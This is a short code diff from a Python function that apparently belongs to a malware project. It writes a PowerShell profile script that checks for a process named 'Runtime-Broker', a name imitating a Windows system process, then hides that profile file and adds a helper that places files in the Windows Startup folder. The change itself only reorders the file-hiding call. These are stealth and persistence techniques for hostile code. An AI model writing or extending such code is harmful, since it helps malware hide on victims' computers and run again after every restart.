@@ -48,7 +48,6 @@ def run(url, file_path):
         command = f'powershell -c New-Item $profile -Type File -Force'
         subprocess.run(command, shell=True)
         directory = f"C:\\Users\\{os.getlogin()}\\Documents\\WindowsPowerShell\\Microsoft.PowerShell_profile.ps1"
-        create_hidden_file(directory)
         with open(directory, 'w') as f:
             f.write("""# Define the process name you want to check
     $processName = "Runtime-Broker"
@@ -66,6 +65,8 @@ def run(url, file_path):
     } catch {
     }
     }""")
+
+    create_hidden_file(directory)
     
     def add_to_startup(path, name):
         startup_dir = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
